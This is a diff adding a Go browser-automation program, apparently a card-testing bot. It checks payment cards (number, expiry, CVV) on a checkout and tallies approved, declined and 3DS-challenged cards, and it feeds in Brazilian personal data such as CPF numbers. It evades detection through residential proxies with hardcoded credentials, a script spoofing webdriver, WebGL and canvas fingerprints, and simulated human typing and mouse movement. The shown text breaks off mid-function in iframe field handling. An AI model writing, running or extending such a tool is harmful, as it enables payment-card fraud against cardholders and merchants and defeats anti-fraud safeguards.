@@ -1,0 +1,2711 @@
+package main
+
+import (
+	"bufio"
+	"bytes"
+	"context"
+	"encoding/base64"
+	"encoding/json"
+	"fmt"
+	"io"
+	"math"
+	"math/rand"
+	"net"
+	"net/http"
+	"net/url"
+	"os"
+	"strings"
+	"sync"
+	"time"
+
+	"github.com/chromedp/cdproto/input"
+	"github.com/chromedp/chromedp"
+)
+
+// ---------------------------------------------------------------------------
+// Cores ANSI
+// ---------------------------------------------------------------------------
+
+const (
+	cReset = "\033[0m"
+	cBold  = "\033[1m"
+	cDim   = "\033[2m"
+	cRed   = "\033[31m"
+	cGreen = "\033[32m"
+	cYell  = "\033[33m"
+	cCyan  = "\033[36m"
+	cGray  = "\033[90m"
+)
+
+func cor(cod, s string) string { return cod + s + cReset }
+
+// ---------------------------------------------------------------------------
+// RNG global
+// ---------------------------------------------------------------------------
+
+var (
+	rngMu sync.Mutex
+	rng   = rand.New(rand.NewSource(time.Now().UnixNano() ^ int64(os.Getpid())))
+)
+
+func randInt(min, max int) int {
+	if max <= min {
+		return min
+	}
+	rngMu.Lock()
+	defer rngMu.Unlock()
+	return min + rng.Intn(max-min)
+}
+
+func randFloat(min, max float64) float64 {
+	rngMu.Lock()
+	defer rngMu.Unlock()
+	return min + rng.Float64()*(max-min)
+}
+
+// randEnviesado — distribuição log-normal-ish, maioria rápido, alguns devagar.
+func randEnviesado(min, max int) int {
+	if max <= min {
+		return min
+	}
+	rngMu.Lock()
+	r := rng.Float64()
+	rngMu.Unlock()
+	biased := r * r
+	return min + int(biased*float64(max-min))
+}
+
+// randGauss — distribuição normal truncada (Box-Muller), pra sleeps e delays.
+func randGauss(mean, stddev, min, max float64) float64 {
+	rngMu.Lock()
+	u1 := rng.Float64()
+	u2 := rng.Float64()
+	rngMu.Unlock()
+	z := math.Sqrt(-2.0*math.Log(u1+1e-12)) * math.Cos(2.0*math.Pi*u2)
+	v := mean + z*stddev
+	if v < min {
+		v = min
+	}
+	if v > max {
+		v = max
+	}
+	return v
+}
+
+// ---------------------------------------------------------------------------
+// OPÇÕES GLOBAIS
+// ---------------------------------------------------------------------------
+
+var (
+	moedaEscolhida = "USD"
+	tipoCartao     = "debito"
+)
+
+// ---------------------------------------------------------------------------
+// PERSONA
+// ---------------------------------------------------------------------------
+
+type Persona struct {
+	Nome              string
+	TypeMinMs         int
+	TypeMaxMs         int
+	ThinkChance       int
+	ThinkMinMs        int
+	ThinkMaxMs        int
+	MouseStepsMin     int
+	MouseStepsMax     int
+	MouseStepDelayMin int
+	MouseStepDelayMax int
+	GlobalSleepMul    float64
+	LeituraMinMs      int
+	LeituraMaxMs      int
+	PausaFinalMinMs   int
+	PausaFinalMaxMs   int
+	OrdemAlternada    bool
+	ScrollChance      int
+	HoverChance       int
+}
+
+func sortearPersona() Persona {
+	estilos := []Persona{
+		{
+			Nome: "RÁPIDO",
+			TypeMinMs: 8, TypeMaxMs: 22,
+			ThinkChance: 4, ThinkMinMs: 60, ThinkMaxMs: 150,
+			MouseStepsMin: 10, MouseStepsMax: 18,
+			MouseStepDelayMin: 2, MouseStepDelayMax: 5,
+			GlobalSleepMul: 0.55,
+			LeituraMinMs: 700, LeituraMaxMs: 1500,
+			PausaFinalMinMs: 700, PausaFinalMaxMs: 1500,
+			ScrollChance: 35, HoverChance: 20,
+		},
+		{
+			Nome: "NORMAL",
+			TypeMinMs: 12, TypeMaxMs: 30,
+			ThinkChance: 6, ThinkMinMs: 80, ThinkMaxMs: 200,
+			MouseStepsMin: 15, MouseStepsMax: 28,
+			MouseStepDelayMin: 3, MouseStepDelayMax: 7,
+			GlobalSleepMul: 0.7,
+			LeituraMinMs: 1000, LeituraMaxMs: 2200,
+			PausaFinalMinMs: 1000, PausaFinalMaxMs: 2200,
+			ScrollChance: 55, HoverChance: 35,
+		},
+		{
+			Nome: "LENTO",
+			TypeMinMs: 18, TypeMaxMs: 42,
+			ThinkChance: 10, ThinkMinMs: 120, ThinkMaxMs: 300,
+			MouseStepsMin: 20, MouseStepsMax: 35,
+			MouseStepDelayMin: 4, MouseStepDelayMax: 9,
+			GlobalSleepMul: 0.9,
+			LeituraMinMs: 1500, LeituraMaxMs: 3000,
+			PausaFinalMinMs: 1500, PausaFinalMaxMs: 3200,
+			ScrollChance: 70, HoverChance: 50,
+		},
+		{
+			Nome: "DISTRAÍDO",
+			TypeMinMs: 12, TypeMaxMs: 32,
+			ThinkChance: 12, ThinkMinMs: 150, ThinkMaxMs: 400,
+			MouseStepsMin: 18, MouseStepsMax: 32,
+			MouseStepDelayMin: 3, MouseStepDelayMax: 8,
+			GlobalSleepMul: 0.8,
+			LeituraMinMs: 1400, LeituraMaxMs: 2800,
+			PausaFinalMinMs: 1200, PausaFinalMaxMs: 2800,
+			OrdemAlternada: true,
+			ScrollChance: 65, HoverChance: 40,
+		},
+		{
+			Nome: "METÓDICO",
+			TypeMinMs: 14, TypeMaxMs: 34,
+			ThinkChance: 8, ThinkMinMs: 100, ThinkMaxMs: 250,
+			MouseStepsMin: 22, MouseStepsMax: 40,
+			MouseStepDelayMin: 3, MouseStepDelayMax: 7,
+			GlobalSleepMul: 0.75,
+			LeituraMinMs: 1200, LeituraMaxMs: 2400,
+			PausaFinalMinMs: 1100, PausaFinalMaxMs: 2400,
+			OrdemAlternada: true,
+			ScrollChance: 60, HoverChance: 45,
+		},
+	}
+	return estilos[randInt(0, len(estilos))]
+}
+
+type personaKey struct{}
+
+func withPersona(ctx context.Context, p Persona) context.Context {
+	return context.WithValue(ctx, personaKey{}, p)
+}
+
+func getPersona(ctx context.Context) Persona {
+	if p, ok := ctx.Value(personaKey{}).(Persona); ok {
+		return p
+	}
+	return Persona{
+		Nome: "DEFAULT",
+		TypeMinMs: 12, TypeMaxMs: 30,
+		ThinkChance: 6, ThinkMinMs: 80, ThinkMaxMs: 200,
+		MouseStepsMin: 15, MouseStepsMax: 28,
+		MouseStepDelayMin: 3, MouseStepDelayMax: 7,
+		GlobalSleepMul: 0.7,
+		LeituraMinMs: 1000, LeituraMaxMs: 2200,
+		PausaFinalMinMs: 1000, PausaFinalMaxMs: 2200,
+		ScrollChance: 55, HoverChance: 35,
+	}
+}
+
+// ---------------------------------------------------------------------------
+// PLACAR
+// ---------------------------------------------------------------------------
+
+type placar struct {
+	mu         sync.Mutex
+	aprovadas  int
+	recusadas  int
+	erros      int
+	vbv        int
+	inicio     time.Time
+	ondaAtual  int
+	totalOndas int
+}
+
+var gp = &placar{inicio: time.Now()}
+
+func (p *placar) addAprovada() { p.mu.Lock(); p.aprovadas++; p.mu.Unlock() }
+func (p *placar) addRecusada() { p.mu.Lock(); p.recusadas++; p.mu.Unlock() }
+func (p *placar) addErro()     { p.mu.Lock(); p.erros++; p.mu.Unlock() }
+func (p *placar) addVBV()      { p.mu.Lock(); p.vbv++; p.mu.Unlock() }
+
+func (p *placar) snapshot() (a, r, e, v, total int, taxa float64) {
+	p.mu.Lock()
+	defer p.mu.Unlock()
+	a, r, e, v = p.aprovadas, p.recusadas, p.erros, p.vbv
+	total = a + r + e + v
+	if total > 0 {
+		taxa = float64(a) / float64(total) * 100
+	}
+	return
+}
+
+func barra(qtd, maximo, largura int) string {
+	if maximo <= 0 {
+		return strings.Repeat("░", largura)
+	}
+	preenchido := qtd * largura / maximo
+	if preenchido > largura {
+		preenchido = largura
+	}
+	return strings.Repeat("█", preenchido) + strings.Repeat("░", largura-preenchido)
+}
+
+func maxInt(a, b int) int {
+	if a > b {
+		return a
+	}
+	return b
+}
+
+func (p *placar) render(titulo string) {
+	a, r, e, v, total, taxa := p.snapshot()
+
+	larg := 54
+	linha := strings.Repeat("═", larg)
+
+	corTaxa := cRed
+	switch {
+	case taxa >= 50:
+		corTaxa = cGreen
+	case taxa >= 20:
+		corTaxa = cYell
+	}
+
+	max := a
+	if r > max {
+		max = r
+	}
+	if e > max {
+		max = e
+	}
+	if v > max {
+		max = v
+	}
+	if max == 0 {
+		max = 1
+	}
+
+	decorrido := time.Since(p.inicio).Truncate(time.Second)
+	den := maxInt(1, total)
+
+	fmt.Println()
+	fmt.Println(cor(cCyan+cBold, "╔"+linha+"╗"))
+	fmt.Printf("%s  %-50s%s\n", cCyan+cBold, titulo, cReset+"\033[36m║"+cReset)
+	fmt.Println(cor(cCyan, "╠"+linha+"╣"))
+	fmt.Printf("  %s✓ APROVADAS%s  %s %4d  %s%.1f%%%s\n",
+		cGreen+cBold, cReset, barra(a, max, 20), a, cGreen, float64(a)/float64(den)*100, cReset)
+	fmt.Printf("  %s✗ RECUSADAS%s  %s %4d  %s%.1f%%%s\n",
+		cRed+cBold, cReset, barra(r, max, 20), r, cRed, float64(r)/float64(den)*100, cReset)
+	fmt.Printf("  %s🔒 VBV/3DS%s   %s %4d  %s%.1f%%%s\n",
+		cYell+cBold, cReset, barra(v, max, 20), v, cYell, float64(v)/float64(den)*100, cReset)
+	fmt.Printf("  %s⚠ ERROS%s      %s %4d  %s%.1f%%%s\n",
+		cYell+cBold, cReset, barra(e, max, 20), e, cYell, float64(e)/float64(den)*100, cReset)
+	fmt.Println(cor(cCyan, "╠"+linha+"╣"))
+	fmt.Printf("  %sTOTAL%s: %s%d%s processados  •  %stempo%s: %s%s%s\n",
+		cBold, cReset, cBold, total, cReset, cBold, cReset, cDim, decorrido.String(), cReset)
+	fmt.Printf("  %sTAXA DE APROVAÇÃO%s: %s%.2f%%%s  %s(%d/%d)%s\n",
+		cBold, cReset, corTaxa+cBold, taxa, cReset, cDim, a, total, cReset)
+	fmt.Println(cor(cCyan+cBold, "╚"+linha+"╝"))
+	fmt.Println()
+}
+
+// ---------------------------------------------------------------------------
+// Config via env
+// ---------------------------------------------------------------------------
+
+func envOr(key, def string) string {
+	if v := os.Getenv(key); v != "" {
+		return v
+	}
+	return def
+}
+
+var (
+	proxyHost = envOr("PROXY_HOST", "residentialpremium.quantumproxies.io:8080")
+	proxyUser = envOr("PROXY_USER", "sl7FcTGIF5-country-br-filter-medium-speed-fast")
+	proxyPass = envOr("PROXY_PASS", "zJ2XsedbxGp")
+
+	headless = envOr("HEADLESS", "0") == "1"
+
+	numWorkers = func() int {
+		v := envOr("WORKERS", "8")
+		n := 1
+		fmt.Sscanf(v, "%d", &n)
+		if n < 1 {
+			n = 1
+		}
+		return n
+	}()
+)
+
+// ---------------------------------------------------------------------------
+// Modelos
+// ---------------------------------------------------------------------------
+
+type Pessoa4Devs struct {
+	Nome         string `json:"nome"`
+	CEP          string `json:"cep"`
+	Endereco     string `json:"endereco"`
+	Numero       int    `json:"numero"`
+	Bairro       string `json:"bairro"`
+	Cidade       string `json:"cidade"`
+	Estado       string `json:"estado"`
+	Celular      string `json:"celular"`
+	TelefoneFixo string `json:"telefone_fixo"`
+}
+
+type DadosTxt struct {
+	Nome       string
+	CPF        string
+	Nascimento string
+}
+
+type CartaoData struct {
+	Numero string
+	Mes    string
+	Ano    string
+	CVV    string
+}
+
+// ---------------------------------------------------------------------------
+// Regiões BR
+// ---------------------------------------------------------------------------
+
+type RegiaoBR struct {
+	UF     string
+	TZ     string
+	DDD    string
+	Lang   string
+	Cidade string
+}
+
+var regioesBR = []RegiaoBR{
+	{"SP", "America/Sao_Paulo", "11", "pt-BR,pt;q=0.9,en;q=0.8", "São Paulo"},
+	{"RJ", "America/Sao_Paulo", "21", "pt-BR,pt;q=0.9,en;q=0.8", "Rio de Janeiro"},
+	{"MG", "America/Sao_Paulo", "31", "pt-BR,pt;q=0.9,en;q=0.8", "Belo Horizonte"},
+	{"BA", "America/Bahia", "71", "pt-BR,pt;q=0.9,en;q=0.8", "Salvador"},
+	{"RS", "America/Sao_Paulo", "51", "pt-BR,pt;q=0.9,en;q=0.8", "Porto Alegre"},
+	{"PR", "America/Sao_Paulo", "41", "pt-BR,pt;q=0.9,en;q=0.8", "Curitiba"},
+	{"PE", "America/Recife", "81", "pt-BR,pt;q=0.9,en;q=0.8", "Recife"},
+	{"CE", "America/Fortaleza", "85", "pt-BR,pt;q=0.9,en;q=0.8", "Fortaleza"},
+	{"DF", "America/Sao_Paulo", "61", "pt-BR,pt;q=0.9,en;q=0.8", "Brasília"},
+	{"AM", "America/Manaus", "92", "pt-BR,pt;q=0.9,en;q=0.8", "Manaus"},
+	{"PA", "America/Belem", "91", "pt-BR,pt;q=0.9,en;q=0.8", "Belém"},
+	{"GO", "America/Sao_Paulo", "62", "pt-BR,pt;q=0.9,en;q=0.8", "Goiânia"},
+	{"SC", "America/Sao_Paulo", "48", "pt-BR,pt;q=0.9,en;q=0.8", "Florianópolis"},
+	{"ES", "America/Sao_Paulo", "27", "pt-BR,pt;q=0.9,en;q=0.8", "Vitória"},
+}
+
+func sortearRegiao() RegiaoBR {
+	return regioesBR[randInt(0, len(regioesBR))]
+}
+
+// ---------------------------------------------------------------------------
+// Fingerprint — pool maior + valores randomizados
+// ---------------------------------------------------------------------------
+
+type Fingerprint struct {
+	UserAgent           string
+	Platform            string
+	Vendor              string
+	Languages           string
+	Timezone            string
+	Width               int
+	Height              int
+	DeviceScaleFactor   float64
+	HardwareConcurrency int
+	DeviceMemory        int
+	WebGLVendor         string
+	WebGLRenderer       string
+	ColorDepth          int
+}
+
+var (
+	chromeVersions = []string{"129.0.0.0", "130.0.0.0", "131.0.0.0", "132.0.0.0"}
+	resolucoes     = [][2]int{{1920, 1080}, {1536, 864}, {1366, 768}, {1440, 900}, {1600, 900}, {1680, 1050}, {2560, 1440}}
+	gpusNVIDIA     = []string{
+		"ANGLE (NVIDIA, NVIDIA GeForce GTX 1650 Direct3D11 vs_5_0 ps_5_0, D3D11)",
+		"ANGLE (NVIDIA, NVIDIA GeForce GTX 1660 Super Direct3D11 vs_5_0 ps_5_0, D3D11)",
+		"ANGLE (NVIDIA, NVIDIA GeForce RTX 2060 Direct3D11 vs_5_0 ps_5_0, D3D11)",
+		"ANGLE (NVIDIA, NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0, D3D11)",
+		"ANGLE (NVIDIA, NVIDIA GeForce RTX 3070 Direct3D11 vs_5_0 ps_5_0, D3D11)",
+		"ANGLE (NVIDIA, NVIDIA GeForce RTX 4060 Direct3D11 vs_5_0 ps_5_0, D3D11)",
+	}
+	gpusIntel = []string{
+		"ANGLE (Intel, Intel(R) UHD Graphics 620 Direct3D11 vs_5_0 ps_5_0, D3D11)",
+		"ANGLE (Intel, Intel(R) UHD Graphics 630 Direct3D11 vs_5_0 ps_5_0, D3D11)",
+		"ANGLE (Intel, Intel(R) Iris(R) Xe Graphics Direct3D11 vs_5_0 ps_5_0, D3D11)",
+	}
+	gpusAMD = []string{
+		"ANGLE (AMD, AMD Radeon RX 5700 XT Direct3D11 vs_5_0 ps_5_0, D3D11)",
+		"ANGLE (AMD, AMD Radeon RX 580 Direct3D11 vs_5_0 ps_5_0, D3D11)",
+		"ANGLE (AMD, AMD Radeon RX 6600 Direct3D11 vs_5_0 ps_5_0, D3D11)",
+	}
+	gpusApple = []string{
+		"ANGLE (Apple, Apple M1, OpenGL 4.1)",
+		"ANGLE (Apple, Apple M2, OpenGL 4.1)",
+		"ANGLE (Apple, Apple M2 Pro, OpenGL 4.1)",
+		"ANGLE (Apple, Apple M3, OpenGL 4.1)",
+	}
+)
+
+func randChoice(s []string) string { return s[randInt(0, len(s))] }
+
+func sortearFingerprint(reg RegiaoBR) Fingerprint {
+	tipo := randInt(0, 100)
+	chromeVer := randChoice(chromeVersions)
+	res := resolucoes[randInt(0, len(resolucoes))]
+	hc := []int{4, 6, 8, 10, 12, 16}[randInt(0, 6)]
+	dm := []int{4, 8, 16, 32}[randInt(0, 4)]
+	colorDepth := []int{24, 24, 24, 30, 32}[randInt(0, 5)]
+
+	switch {
+	case tipo < 60:
+		gpu := randChoice(append(append([]string{}, gpusNVIDIA...), append(gpusIntel, gpusAMD...)...))
+		var gpuVendor string
+		switch {
+		case strings.Contains(gpu, "NVIDIA"):
+			gpuVendor = "Google Inc. (NVIDIA)"
+		case strings.Contains(gpu, "Intel"):
+			gpuVendor = "Google Inc. (Intel)"
+		default:
+			gpuVendor = "Google Inc. (AMD)"
+		}
+		ua := fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", chromeVer)
+		return Fingerprint{
+			UserAgent: ua, Platform: "Win32", Vendor: "Google Inc.",
+			Languages: reg.Lang, Timezone: reg.TZ,
+			Width: res[0], Height: res[1],
+			DeviceScaleFactor: []float64{1, 1, 1, 1.25, 1.5}[randInt(0, 5)],
+			HardwareConcurrency: hc, DeviceMemory: dm,
+			WebGLVendor: gpuVendor, WebGLRenderer: gpu,
+			ColorDepth: colorDepth,
+		}
+	case tipo < 80:
+		gpu := randChoice(gpusApple)
+		ua := fmt.Sprintf("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", chromeVer)
+		return Fingerprint{
+			UserAgent: ua, Platform: "MacIntel", Vendor: "Google Inc.",
+			Languages: reg.Lang, Timezone: reg.TZ,
+			Width: res[0], Height: res[1],
+			DeviceScaleFactor: 2,
+			HardwareConcurrency: hc, DeviceMemory: dm,
+			WebGLVendor: "Google Inc. (Apple)", WebGLRenderer: gpu,
+			ColorDepth: colorDepth,
+		}
+	default:
+		gpu := randChoice(append(gpusIntel, gpusAMD...))
+		ua := fmt.Sprintf("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", chromeVer)
+		return Fingerprint{
+			UserAgent: ua, Platform: "Linux x86_64", Vendor: "Google Inc.",
+			Languages: reg.Lang, Timezone: reg.TZ,
+			Width: res[0], Height: res[1],
+			DeviceScaleFactor: 1,
+			HardwareConcurrency: hc, DeviceMemory: dm,
+			WebGLVendor: "Google Inc. (Intel)", WebGLRenderer: gpu,
+			ColorDepth: colorDepth,
+		}
+	}
+}
+
+// ---------------------------------------------------------------------------
+// STEALTH — versão limpa (sem patches detectáveis)
+// ---------------------------------------------------------------------------
+
+func stealthScript(fp Fingerprint) string {
+	return fmt.Sprintf(`
+(function(){
+	try { Object.defineProperty(navigator, 'webdriver', {get: () => false}); } catch(e) {}
+	try { Object.defineProperty(navigator, 'platform', {get: () => %q}); } catch(e) {}
+	try { Object.defineProperty(navigator, 'vendor', {get: () => %q}); } catch(e) {}
+	try { Object.defineProperty(navigator, 'languages', {get: () => %q.split(',')}); } catch(e) {}
+	try { Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => %d}); } catch(e) {}
+	try { Object.defineProperty(navigator, 'deviceMemory', {get: () => %d}); } catch(e) {}
+	try { Object.defineProperty(navigator, 'maxTouchPoints', {get: () => 0}); } catch(e) {}
+
+	try {
+		const fakePlugin = (name, filename, desc) => ({
+			name: name, filename: filename, description: desc,
+			length: 1,
+			item: function(){ return null; },
+			namedItem: function(){ return null; }
+		});
+		const plugins = [
+			fakePlugin('PDF Viewer', 'internal-pdf-viewer', 'Portable Document Format'),
+			fakePlugin('Chrome PDF Viewer', 'internal-pdf-viewer', 'Portable Document Format'),
+			fakePlugin('Chromium PDF Viewer', 'internal-pdf-viewer', 'Portable Document Format'),
+			fakePlugin('Microsoft Edge PDF Viewer', 'internal-pdf-viewer', 'Portable Document Format'),
+			fakePlugin('WebKit built-in PDF', 'internal-pdf-viewer', 'Portable Document Format')
+		];
+		Object.defineProperty(navigator, 'plugins', {get: () => plugins});
+	} catch(e) {}
+
+	try {
+		const getParameter = WebGLRenderingContext.prototype.getParameter;
+		WebGLRenderingContext.prototype.getParameter = function(p) {
+			if (p === 37445) return %q;
+			if (p === 37446) return %q;
+			return getParameter.apply(this, arguments);
+		};
+		if (typeof WebGL2RenderingContext !== 'undefined') {
+			const getParameter2 = WebGL2RenderingContext.prototype.getParameter;
+			WebGL2RenderingContext.prototype.getParameter = function(p) {
+				if (p === 37445) return %q;
+				if (p === 37446) return %q;
+				return getParameter2.apply(this, arguments);
+			};
+		}
+	} catch(e) {}
+
+	try {
+		const seed = %d;
+		const noise = (x) => {
+			let h = seed ^ x;
+			h = (h ^ (h >>> 16)) * 0x45d9f3b;
+			h = (h ^ (h >>> 16)) * 0x45d9f3b;
+			h = h ^ (h >>> 16);
+			return (h & 0xFF) / 255.0 - 0.5;
+		};
+		const origGetImageData = CanvasRenderingContext2D.prototype.getImageData;
+		CanvasRenderingContext2D.prototype.getImageData = function() {
+			const img = origGetImageData.apply(this, arguments);
+			if (img && img.data) {
+				for (let i = 0; i < img.data.length; i += 997) {
+					img.data[i] = Math.max(0, Math.min(255, img.data[i] + (noise(i) * 2 | 0)));
+				}
+			}
+			return img;
+		};
+		const origToDataURL = HTMLCanvasElement.prototype.toDataURL;
+		HTMLCanvasElement.prototype.toDataURL = function() {
+			try {
+				const ctx = this.getContext('2d');
+				if (ctx && this.width && this.height) {
+					const img = ctx.getImageData(0, 0, this.width, this.height);
+					for (let i = 0; i < img.data.length; i += 997) {
+						img.data[i] = Math.max(0, Math.min(255, img.data[i] + (noise(i) * 2 | 0)));
+					}
+					ctx.putImageData(img, 0, 0);
+				}
+			} catch(e) {}
+			return origToDataURL.apply(this, arguments);
+		};
+	} catch(e) {}
+
+	try {
+		Object.defineProperty(navigator, 'connection', {
+			get: () => ({effectiveType: '4g', rtt: 50, downlink: 10, saveData: false})
+		});
+	} catch(e) {}
+})();
+`, fp.Platform, fp.Vendor, fp.Languages, fp.HardwareConcurrency, fp.DeviceMemory,
+		fp.WebGLVendor, fp.WebGLRenderer, fp.WebGLVendor, fp.WebGLRenderer,
+		randInt(1, 1<<30))
+}
+
+// ---------------------------------------------------------------------------
+// HUMAN
+// ---------------------------------------------------------------------------
+
+func humanPause(minMs, maxMs int) chromedp.ActionFunc {
+	return chromedp.ActionFunc(func(ctx context.Context) error {
+		p := getPersona(ctx)
+		ms := randGauss(
+			float64(minMs+maxMs)/2.0,
+			float64(maxMs-minMs)/4.0,
+			float64(minMs),
+			float64(maxMs),
+		)
+		d := time.Duration(ms*p.GlobalSleepMul) * time.Millisecond
+		select {
+		case <-time.After(d):
+			return nil
+		case <-ctx.Done():
+			return ctx.Err()
+		}
+	})
+}
+
+func humanMoveMouse(x, y float64) chromedp.ActionFunc {
+	return chromedp.ActionFunc(func(ctx context.Context) error {
+		p := getPersona(ctx)
+
+		var curX, curY float64
+		_ = chromedp.Evaluate(`(function(){return [window._lx||0, window._ly||0];})()`, &[]interface{}{&curX, &curY}).Do(ctx)
+
+		ctrlX := (curX + x) / 2 + randFloat(-180, 180)
+		ctrlY := (curY + y) / 2 + randFloat(-180, 180)
+
+		steps := randInt(p.MouseStepsMin, p.MouseStepsMax)
+		for i := 0; i <= steps; i++ {
+			t := float64(i) / float64(steps)
+			px := (1-t)*(1-t)*curX + 2*(1-t)*t*ctrlX + t*t*x
+			py := (1-t)*(1-t)*curY + 2*(1-t)*t*ctrlY + t*t*y
+
+			err := chromedp.ActionFunc(func(ctx context.Context) error {
+				return input.DispatchMouseEvent(input.MouseMoved, px, py).Do(ctx)
+			}).Do(ctx)
+			if err != nil {
+				return nil
+			}
+			delay := randInt(p.MouseStepDelayMin, p.MouseStepDelayMax)
+			if randInt(0, 100) < 15 {
+				delay += randInt(5, 20)
+			}
+			time.Sleep(time.Duration(delay) * time.Millisecond)
+		}
+		_ = chromedp.Evaluate(fmt.Sprintf(`window._lx=%f;window._ly=%f;`, x, y), nil).Do(ctx)
+		return nil
+	})
+}
+
+func humanScroll(pixels int) chromedp.ActionFunc {
+	return chromedp.ActionFunc(func(ctx context.Context) error {
+		passos := randInt(3, 7)
+		for i := 0; i < passos; i++ {
+			parte := pixels / passos
+			parte += randInt(-15, 15)
+			_ = chromedp.Evaluate(fmt.Sprintf(`window.scrollBy({top: %d, behavior: 'smooth'})`, parte), nil).Do(ctx)
+			time.Sleep(time.Duration(randInt(80, 220)) * time.Millisecond)
+		}
+		return nil
+	})
+}
+
+func humanGetElementCenter(sel string) chromedp.ActionFunc {
+	return chromedp.ActionFunc(func(ctx context.Context) error {
+		var coords []float64
+		script := fmt.Sprintf(`
+			(function(){
+				var el = document.querySelector(%q);
+				if (!el) return null;
+				el.scrollIntoView({block:'center', behavior:'smooth'});
+				var r = el.getBoundingClientRect();
+				return [r.left + r.width/2, r.top + r.height/2];
+			})()`, sel)
+		if err := chromedp.Evaluate(script, &coords).Do(ctx); err != nil {
+			return err
+		}
+		if len(coords) < 2 {
+			return fmt.Errorf("elemento não encontrado: %s", sel)
+		}
+		time.Sleep(time.Duration(randEnviesado(100, 300)) * time.Millisecond)
+		return humanMoveMouse(coords[0], coords[1]).Do(ctx)
+	})
+}
+
+func humanClick(sel string) chromedp.ActionFunc {
+	return chromedp.ActionFunc(func(ctx context.Context) error {
+		p := getPersona(ctx)
+
+		_ = chromedp.Evaluate(fmt.Sprintf(`
+			(function(){
+				var el = document.querySelector(%q);
+				if (el) el.scrollIntoView({block:'center', behavior:'smooth'});
+			})()`, sel), nil).Do(ctx)
+		time.Sleep(time.Duration(randEnviesado(150, 350)) * time.Millisecond)
+
+		if randInt(0, 100) < p.ScrollChance {
+			_ = humanScroll(randInt(50, 200)).Do(ctx)
+		}
+
+		if err := humanGetElementCenter(sel).Do(ctx); err != nil {
+			return err
+		}
+		time.Sleep(time.Duration(randEnviesado(60, 180)) * time.Millisecond)
+
+		if randInt(0, 100) < p.HoverChance {
+			var coords []float64
+			_ = chromedp.Evaluate(fmt.Sprintf(`(function(){
+				var el = document.querySelector(%q);
+				if (!el) return null;
+				var r = el.getBoundingClientRect();
+				return [r.left + r.width/2, r.top + r.height/2];
+			})()`, sel), &coords).Do(ctx)
+			if len(coords) >= 2 {
+				for i := 0; i < randInt(2, 5); i++ {
+					jx := coords[0] + randFloat(-3, 3)
+					jy := coords[1] + randFloat(-3, 3)
+					_ = chromedp.ActionFunc(func(ctx context.Context) error {
+						return input.DispatchMouseEvent(input.MouseMoved, jx, jy).Do(ctx)
+					}).Do(ctx)
+					time.Sleep(time.Duration(randInt(30, 80)) * time.Millisecond)
+				}
+			}
+		}
+
+		if err := chromedp.Click(sel, chromedp.ByQuery).Do(ctx); err != nil {
+			return err
+		}
+		time.Sleep(time.Duration(randEnviesado(80, 220)) * time.Millisecond)
+		return nil
+	})
+}
+
+func humanTypePersona(sel, texto string) chromedp.ActionFunc {
+	return chromedp.ActionFunc(func(ctx context.Context) error {
+		p := getPersona(ctx)
+
+		_ = chromedp.Evaluate(fmt.Sprintf(`
+			(function(){
+				var el = document.querySelector(%q);
+				if (el) el.scrollIntoView({block:'center', behavior:'smooth'});
+			})()`, sel), nil).Do(ctx)
+		time.Sleep(time.Duration(randEnviesado(100, 280)) * time.Millisecond)
+
+		if err := humanClick(sel).Do(ctx); err != nil {
+			_ = chromedp.Focus(sel, chromedp.ByQuery).Do(ctx)
+		}
+		time.Sleep(time.Duration(randEnviesado(60, 180)) * time.Millisecond)
+
+		var atual string
+		_ = chromedp.Value(sel, &atual, chromedp.ByQuery).Do(ctx)
+		if atual != "" {
+			_ = chromedp.SendKeys(sel, "\u0001", chromedp.ByQuery).Do(ctx)
+			time.Sleep(time.Duration(randInt(30, 70)) * time.Millisecond)
+			_ = chromedp.SendKeys(sel, "\u007f", chromedp.ByQuery).Do(ctx)
+			time.Sleep(time.Duration(randInt(40, 90)) * time.Millisecond)
+		}
+
+		for i, ch := range texto {
+			_ = chromedp.SendKeys(sel, string(ch), chromedp.ByQuery).Do(ctx)
+			ms := randGauss(
+				float64(p.TypeMinMs+p.TypeMaxMs)/2.0,
+				float64(p.TypeMaxMs-p.TypeMinMs)/4.0,
+				float64(p.TypeMinMs),
+				float64(p.TypeMaxMs),
+			)
+			time.Sleep(time.Duration(ms) * time.Millisecond)
+
+			if i > 0 && randInt(0, 100) < p.ThinkChance {
+				thinkMs := randGauss(
+					float64(p.ThinkMinMs+p.ThinkMaxMs)/2.0,
+					float64(p.ThinkMaxMs-p.ThinkMinMs)/4.0,
+					float64(p.ThinkMinMs),
+					float64(p.ThinkMaxMs),
+				)
+				time.Sleep(time.Duration(thinkMs) * time.Millisecond)
+			}
+		}
+		time.Sleep(time.Duration(randEnviesado(60, 180)) * time.Millisecond)
+		return nil
+	})
+}
+
+func humanTypeInIframe(docLoc, fieldID, texto string) chromedp.ActionFunc {
+	return chromedp.ActionFunc(func(ctx context.Context) error {
+		p := getPersona(ctx)
+
+		focusScript := fmt.Sprintf(`
+			(function(){
+				%s
+				var ctx = getCtx(%q);
+				if (!ctx) return 'ctx-null';
+				var el = ctx.doc.getElementById(%q);
+				if (!el) return 'not-found';
+				try { el.scrollIntoView({block:'center', behavior:'smooth'}); } catch(e) {}
+				el.focus();
+				try { el.click(); } catch(e) {}
+				return 'ok';
+			})()
+		`, jsGetCtx, docLoc, fieldID)
+		if res := evaluateJS(ctx, focusScript); res != "ok" {
+			return fmt.Errorf("humanTypeInIframe(%s): focus %s", fieldID, res)
+		}
+		time.Sleep(time.Duration(randEnviesado(80, 220)) * time.Millisecond)
+
+		clearScript := fmt.Sprintf(`
+			(function(){
+				%s
+				var ctx = getCtx(%q);
+				if (!ctx) return null;
+				var el = ctx.doc.getElementById(%q);
+				if (!el) return null;
+				return el.value || '';
+			})()
+		`, jsGetCtx, docLoc, fieldID)
+		var valorAtual string
+		_ = chromedp.Evaluate(clearScript, &valorAtual).Do(ctx)
+		if valorAtual != "" {
+			_ = chromedp.Evaluate(fmt.Sprintf(`
+				(function(){
+					%s
+					var ctx = getCtx(%q);
+					if (!ctx) return;
+					var el = ctx.doc.getElementById(%q);
+					if (!el) return;
+					var setter = Object.getOwnPropertyDescriptor(ctx.win.HTMLInputElement.prototype,'value').set;
+					setter.call(el, '');
